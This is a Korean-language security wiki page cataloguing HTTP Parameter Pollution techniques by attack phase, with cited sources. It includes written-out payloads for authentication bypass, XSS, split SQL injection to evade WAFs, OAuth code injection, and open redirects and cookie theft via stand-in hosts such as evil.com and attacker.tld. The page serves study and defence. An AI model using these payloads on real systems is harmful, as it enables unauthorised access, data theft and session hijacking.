---
title: HTTP Parameter Pollution
description: 
published: true
date: 2025-07-31T22:37:42.007Z
tags: attack success validation, data exfiltration, authentication bypass, technology‑specific parsing analysis, application logic and filter analysis, dual parameter injection, duplicate parameter injection, split‑payload concatenation, parameter tampering, data theft, parameter override, cross‑site scripting (xss), open redirect, sql injection, application behavior manipulation
editor: markdown
dateCreated: 2025-07-14T13:28:11.791Z
---

# HTTP Parameter Pollution

## 개요

“HTTP Parameter Pollution”은 쿼리 스트링 또는 요청 본문 내 동일한 키 이름의 파라미터를 반복 삽입하여, 서버 또는 백엔드 파서마다 파라미터 병합 방식이 다르게 동작하는 불일치를 악용한다. 일부 시스템은 첫 번째 값을 우선 처리하고, 일부는 마지막 값을, 혹은 전체 배열로 처리하는 등 해석 방식에 차이가 발생하며, 이를 통해 인증 우회, 권한 상승, 리디렉션 조작 등 비정상적인 동작을 유도할 수 있다. 파라미터 해석 기준이 클라이언트와 서버, 또는 프론트엔드와 백엔드 간 상이할 경우 최종적으로 보안 정책이 우회된다.

## 분류

> 구문 분석 불일치 (Syntax Parsing Gap)  
> → 중복 키 처리 불일치 (Duplicate Key Handling Mismatch)  
> → HTTP Parameter Pollution

## 절차

| Phase         | Description                                                                                     |
|---------------|-------------------------------------------------------------------------------------------------|
| Reconnaissance| 대상 애플리케이션이 쿼리스트링, 폼, REST 호출 등에서 동일 이름 파라미터를 여러 번 받을 수 있는지 탐색한다. 개발 언어, 프레임워크별로 중복 파라미터를 “첫 값만 사용, 마지막 값만 사용, 전부 연결” 가운데 어떤 방식으로 처리하는지도 확인한다. |
| Injection     | 실제 요청에 /`home?redirectURL=internalPage&redirectURL=http://evil.com` 같이 중복된 파라미터를 삽입한다. |
| Validation    | 응답을 비교해(가격 조작 성공 여부, 302→200)·서버 로그·DOM 검사로 취약 여부를 확인한다. |
| Exploitation  | 중복 파라미터로 DB 쿼리, 권한 플래그, 파일 경로 등을 조작해서 권한 우회, 데이터 노출, 원격 코드 실행, WAF 우회 등을 수행한다. |
| Bypass        | 공격 벡터를 여러 개 파라미터로 분할하거나 일부 값을 URL 인코딩, 대소문자 변형, 공백 삽입 등으로 변형하여 WAF나 패턴 필터가 탐지하지 못하도록 우회한다. |
| Exfiltration  | 조작된 파라미터를 이용하여 응답을 외부로 리다이렉션하거나 공격자 서버로 전송한다. |

<div style="text-align: left;">
  <img
    src="/http_parameter_pollution_2.png"
    alt="HTTP Parameter Pollution 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Parameter Parsing Fingerprinting</td>
      <td><pre><code>?color=red&color=blue
?user=alice&user=bob 
?par1=val1&par1=new_val 
전송 시:?color=red&color=blue 
ASP.NET:color=red,blue
PHP/Apache:color=blue
JSP/Tomcat:color=red</code></pre></td>
      <td>서버 측 스펙(ASP.NET , PHP, JSP 등)에 따라 중복 파라미터 처리 방식이 어떻게 다른지 식별한다. 일부는 마지막 값을, 일부는 첫 값을, 일부는 값을 병합하여 처리한다. </td>
      <td>[2], [6]</td>
    </tr>
    <tr>
      <td>Parameter Parsing Mismatch</td>
      <td><pre><code>Django: request.GET.get("user_id")
Flask: request.get_json(force=True).get("user_id")
Go: r.URL.Query().Get(":team_name") vs r.FormValue(":team_name")</code></pre></td>
      <td>프론트엔드와 백엔드, 또는 동일 애플리케이션 내의 서로 다른 보안 검사 로직 간에 파라미터 소스가 다른 경우(URL 쿼리 vs 요청 본문) 발생하는 해석 불일치를 식별한다.</td>
      <td>[7], [10]</td>
    </tr>
    <tr>
      <td>Application Logic and Filter Analysis</td>
      <td><pre><code>/intersticial.aspx?dest=data://whitelistedWebsite.com
/intersticial.aspx?dest=http://google.com
-> dest 파라미터의 javascript: 스킴 허용, 화이트리스트 기반 URL 필터링, 세미콜론 차단 등의 필터링 규칙을 식별한다.</code></pre></td>
      <td>외부 사이트로의 이동 전 중간 페이지(/intersticial.aspx)를 거치는 것을 식별한다.
해당 페이지의 URL을 분석하여, 파라미터(dest) 필터링 규칙을 파악한다.</td>
      <td>[9]</td>
    </tr>
  </tbody>
</table>

### Injection
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Duplicate Parameter Injection</td>
      <td><pre><code>?logged-in=true&logged-in=false </code></pre></td>
      <td>특정 기능(인증, ID, 가격 등)을 수행하는 파라미터를 의도적으로 중복 삽입하여, 서버가 비정상적인 값을 처리하도록 유도한다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Dual Parameter Injection (Query & Body)</td>
      <td><pre><code>GET /user?user_id=1234
Content-Type: application/json
{"user_id": 9999}</code></pre></td>
      <td>프론트엔드(Django)의 인증을 통과하기 위한 파라미터는 쿼리 스트링에, 백엔드(Flask)에서 처리할 파라미터는 요청 본문에 삽입하여 동시에 전송한다.</td>
      <td>[7]</td>
    </tr>
    <tr>
      <td>Parameter Injection via URL and Request Body</td>
      <td><pre><code>POST /registered/main.pl?cmd=unifiedPayment... HTTP/1.1
CRLF: Injection HTTP/1.1
Host: direct.yandex.ru
...
Content-Type: application/x-www-form-urlencoded
cmd=foobar</code></pre>
<br>PUT /api/v1/teams/team1/... HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded
:team_name=team2</td>
      <td>인증 검사에 사용될 파라미터는 URL(경로 또는 쿼리)에, 실제 데이터 처리에 사용될 파라미터는 요청 본문에 주입하는 방식이다.</td>
      <td>[8], [10]</td>
    </tr>
    <tr>
      <td>Duplicate Parameter Injection for XSS</td>
      <td><pre><code><redacted>intersticial.aspx?dest=javascript:/whitelistedWebsite.com/i&dest=alert(1)</code></pre></td>
      <td>XSS 페이로드를 두 개의 dest 파라미터로 분할한다. 첫 번째 파라미터는 javascript: 스킴과 화이트리스트된 웹사이트를 포함하여 필터를 우회하고, 두 번째 파라미터에 실제 JS 페이로드를 주입한다.</td>
      <td>[9]</td>
    </tr>
    <tr>
      <td>OAuth 2.0 Parameter Pollution (OPP)</td>
      <td><pre><code>redirect_uri=https://client.com/callback%3Fcode%3DATTACKER_CODE
//최종 URL:
.../callback?code=ATTACKER_CODE&code=VICTIM_CODE</code></pre></td>
      <td>OAuth 2.0의 redirect_uri 파라미터 값 내부에, URL 인코딩된 구분자(%3F -> ?)와 함께 또 다른 파라미터(code=ATTACKER_CODE)를 숨겨서 주입한다. 이는 IdP(Identity Provider)가 이 값을 디코딩하고 리다이렉션하는 과정에서, 최종적으로 Client에게는 중복된 code 파라미터가 전달되도록 만들기 위한 기법이다.</td>
      <td>[A]</td>
    </tr>
  </tbody>
</table>

### Validation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Nonce Injection and Response Verification (V-Scan)</td>
      <td><pre><code>?q=italy%26foo%3Dbar </code></pre></td>
      <td>악의 없는 임의의 값(nonce)을 인코딩하여 파라미터로 주입한 뒤, 응답 페이지에 해당 값이 디코딩된 형태(&foo=bar)로 존재하는지 확인함으로써 HPP 취약점 존재 여부를 검증한다. </td>
      <td>[6]</td>
    </tr>
    <tr>
      <td>Response Data Verification</td>
      <td><pre><code>Response:
{
"user_id_used": 9999,
"data": "Private data for user 9999"
}</code></pre></td>
      <td>서버 응답을 통해, 요청 본문에 주입한 user_id가 실제로 처리되었고 해당 사용자의 비공개 데이터가 반환되는지 확인함으로써 취약점 존재 여부를 검증한다.</td>
      <td>[7]</td>
    </tr>
  </tbody>
</table>

### Exploitation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Authentication Bypass</td>
      <td><pre><code>blogID=attackerblogidvalue&blogID=victimblogidvalue </code></pre></td>
      <td>인증 검사는 첫 번째 파라미터(blogID)로 수행하고, 실제 소유권 변경 작업은 두 번째 파라미터(blogID)로 수행하는 로직의 허점을 이용해 다른 사용자의 블로그 소유권을 탈취한다.</td>
      <td>[2]</td>
    </tr>
    <tr>
      <td>Data Theft</td>
      <td><pre><code>?id=123&id=456</code></pre></td>
      <td>인가된 ID(123)와 비인가된 ID(456)를 함께 전송하여, 애플리케이션이 마지막 값(456)을 처리하게 만들어 다른 사용자의 데이터를 탈취한다. </td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Parameter Tampering</td>
      <td><pre><code>?product-id=123&product-id=456</code></pre></td>
      <td>상품 ID와 같은 파라미터를 조작하여, 애플리케이션이 의도치 않은 상품의 가격이나 정보를 표시하도록 만든다.</td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Cross-Site Scripting (XSS) </td>
      <td><pre><code>?query=apples&query=&lt;script>alert('XSS')&lt;/script>
?par1=&lt;script&par1=prompt.”...”>
?colour=blue&colour=&lt;script>...&lt;/script></code></pre></td>
      <td>검색어와 같은 파라미터에 악성 스크립트를 중복 주입하여 XSS를 유발한다. 
악성 스크립트를 여러 파라미터로 분할하여 전송하거나(Payload Splitting), 정상적인 파라미터 뒤에 악성 파라미터를 숨겨 전송하는(Benign Parameter) 방식이 있다. </td>
      <td>[1], [3], [4]</td>
    </tr>
    <tr>
      <td>Application Behavior Manipulation</td>
      <td><pre><code>&lt;a href=viewemail.jsp?client_id=...&action=delete&action=view > View &lt;/a>
&lt;a href=vote.jsp?pool_id=...&candidate=green&candidate=white></code></pre></td>
      <td>공격자가 파라미터에 인코딩된 값을 주입하면, 서버는 동적으로 파라미터가 중복된 링크를 생성한다. JSP 서버는 첫 번째 값을 우선 처리하므로, 사용자가 의도한 동작(view, white)과 다른 기능(delete, green)이 실행되어 애플리케이션의 동작이 조작된다. </td>
      <td>[3], [6]</td>
    </tr>
    <tr>
      <td>Parameter Override </td>
      <td><pre><code>?sender=Victim&sender=Victim </code></pre></td>
      <td>서버가 내부적으로 덧붙이는 파라미터(sender)를 공격자가 중복 주입한다. 서버가 첫 번째 인스턴스만 제거할 경우, 두 번째 악성 파라미터가 백엔드로 전달되어 다른 사용자의 계좌에서 출금하는 등의 공격이 가능해진다. </td>
      <td>[4]</td>
    </tr>
    <tr>
    <tr>
      <td>Open Redirect</td>
      <td><pre><code>?redirectURL=internalPage&redirectURL=&lt;http://malicious.com></code></pre></td>
      <td>정상적인 내부 페이지로의 리디렉션 파라미터 뒤에 악성 외부 사이트로의 리디렉션 파라미터를 추가한다. 서버가 중복 파라미터를 잘못 처리할 경우(예: 값 병합 또는 마지막 값 우선), 사용자는 의도치 않게 악성 사이트로 리디렉션될 수 있다. </td>
      <td>[5]</td>
    </tr>
    <tr>
      <td>SQL Injection</td>
      <td><pre><code>/index.aspx?page=select 1&page=2,3 from table?id=5;select+1&id=2&id=3+from+users...</code></pre></td>
      <td>WAF가 탐지하기 어려운 형태로 SQL 인젝션 페이로드를 여러 파라미터에 분할하여 전송한다. 백엔드 애플리케이션이 이 값들을 하나로 병합하면서 완전한 공격 구문이 재조립되어, 비인가된 데이터베이스 명령을 실행한다. </td>
      <td>[1], [2], [6]</td>
    </tr>
    <tr>
      <td>Authentication Bypass via Framework Parsing Mismatch</td>
      <td><pre><code>curl -X GET "https://target.com/user?user_id=1234" \
-H "Content-Type: application/json" \
-d '{"user_id": 9999}'</code></pre>
        <pre><code> PUT /api/v1/teams/team1/... 
<br> -d ':team_name=team2' </code> </pre> </td>
      <td>프론트엔드와 백엔드, 또는 애플리케이션 내의 단계별 보안 검사 로직이 서로 다른 소스(URL, 요청 본문 등)의 파라미터를 신뢰하는 불일치를 이용해 인증을 우회하고 다른 사용자의 데이터나 리소스에 접근한다. (수평적 권한 상승)</td>
      <td>[7], [10]</td>
    </tr>
    <tr>
      <td>HPP and Open Redirect Combination</td>
      <td><pre><code>POST /registered/main.pl?cmd=unifiedPayment... HTTP/1.1
CRLF: Injection HTTP/1.1
Host: direct.yandex.ru
Cookie: Session_id=xxx;
Content-Type: application/x-www-form-urlencoded
cmd=unlockCamp&retpath=//attacker.tld/</code></pre></td>
      <td>CRLF Injection으로 생성된 두 번째 요청의 본문에 HPP(HTTP Parameter Pollution)를 이용해 cmd 파라미터(unifiedPayment -> unlockCamp)를 조작하고, retpath 파라미터에 외부 URL을 지정하여 Open Redirect를 유발한다.</td>
      <td>[8]</td>
    </tr>
  </tbody>
</table>

### Bypass
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Split-Payload Concatenation </td>
      <td><pre><code>/index.aspx?page=select 1&page=2,3 from table?
id=5;select+1&id=2&id=3+from+users...</code></pre></td>
      <td>WAF가 탐지하기 어려운 형태로 SQL 인젝션 같은 공격 페이로드를 여러 파라미터에 분할하여 전송한다. 백엔드 애플리케이션이 이 값들을 하나로 병합하면서 완전한 공격 구문이 재조립되어 WAF를 우회한다.</td>
      <td>[2], [6]</td>
    </tr>
    <tr>
      <td>WAF Bypass via Payload Splitting</td>
      <td><pre><code>?par1=&lt;script&par1=prompt.”...”> </code></pre></td>
      <td>WAF가 각 파라미터를 개별적으로 검사하는 점을 악용하여, 악성 스크립트( &lt;script prompt... >)를 두 개 이상의 파라미터로 분할하여 전송한다. 백엔드(ASP.NET 등)가 이 값들을 병합하면서 완전한 공격 구문이 실행된다. </td>
      <td>[3]</td>
    </tr>
    <tr>
      <td>WAF Bypass via Benign Parameter</td>
      <td><pre><code>?colour=blue&colour=&lt;script>...&lt;/script> </code></pre></td>
      <td>WAF는 첫 번째 정상 파라미터(blue)만 보고 요청을 통과시키지만, 실제 애플리케이션은 두 번째 악성 파라미터(&lt;script>...)를 처리하게 만들어 WAF를 우회한다. </td>
      <td>[4]</td>
    </tr>
  </tbody>
</table>

### Exfiltration
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Database Column Exfiltration</td>
      <td><pre><code>?department=engineering%26what%3Dpasswd</code></pre></td>
      <td>department 파라미터 값에 인코딩된 &what=passwd를 주입한다. 백엔드 서버가 이를 디코딩하면, 원래는 users만 조회하던 데이터베이스 쿼리에 passwd 컬럼이 추가되어, 응답 페이지에 사용자의 비밀번호 정보가 함께 노출(유출)된다.</td>
      <td>[6]</td>
    </tr>
    <tr>
      <td>Data Theft via Response</td>
      <td><pre><code>?id=123&id=456 </code></pre></td>
      <td>HPP를 이용해 다른 사용자의 ID로 데이터를 조회하도록 시스템을 속인 뒤, 그 결과가 HTTP 응답 본문에 포함되어 공격자에게 전송되도록 하여 데이터를 유출한다. </td>
      <td>[1]</td>
    </tr>
    <tr>
      <td>Cookie Exfiltration via Open Redirect</td>
      <td><pre><code>Location: //attacker.tld? HTTP/1.0 […] Cookie: param=value#value; Session_id=[…]</code></pre></td>
      <td>HPP를 통해 유발된 Open Redirect 취약점을 이용해, 사용자의 브라우저가 공격자의 서버로 리디렉션될 때 httpOnly 속성의 Session_id 쿠키를 탈취한다.</td>
      <td>[8]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

[1] https://cqr.company/web-vulnerabilities/http-parameter-pollution-hpp-attacks/  
[2] https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution  
[3] https://www.acunetix.com/websitesecurity/HTTP-Parameter-Pollution-WhitePaper.pdf  
[4] https://appcheck-ng.com/deep-dive-http-parameter-pollution/  
[5] https://www.imperva.com/learn/application-security/http-parameter-pollution/  
[6] https://www.blackhat.com/docs/webcast/bhwebcast28-balduzzi.pdf  
[7] https://medium.com/@pranshux0x/5-000-authorization-bypass-via-parameter-parsing-mismatch-django-flask-6f0f748db6be  
[8] https://web.archive.org/web/20240113000047/https://offzone.moscow/upload/iblock/11a/sagouc86idiapdb8f29w41yaupqv6fwv.pdf  
[9] https://medium.com/@momenbasel/from-parameter-pollution-to-xss-d095e13be060  
[10] https://medium.com/@rramgattie/exploiting-parameter-pollution-in-golang-web-apps-daca72b28ce2

## 기타 참고문헌

[A] https://innotommy.com/Wrong_redirect_uri_validation_in_OAuth-4.pdf
